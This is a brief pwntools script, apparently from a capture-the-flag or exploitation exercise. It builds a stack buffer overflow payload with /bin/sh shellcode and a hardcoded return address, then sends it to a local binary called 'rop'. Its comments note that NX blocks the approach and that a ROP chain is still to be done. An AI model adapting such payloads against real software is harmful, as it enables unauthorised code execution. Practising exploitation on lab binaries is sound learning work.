from pwn import *
context(os='linux', arch='i386')
# 12bytes arr + 4bytes old ebp + 4bytes ret addr
shellcode = asm(shellcraft.sh())
# shellcode = asm(shellcraft.pushstr('haha') + shellcraft.syscall('SYS_write', 1, 'esp', 4))
print(len(shellcode))
print(shellcode)
payload = shellcode + b'A'*16 + bytes.fromhex('9ccfffff')
pr = process('rop')
pr.send(payload)
pr.interactive()
# NX enabled
# need ROP chain
# TODO
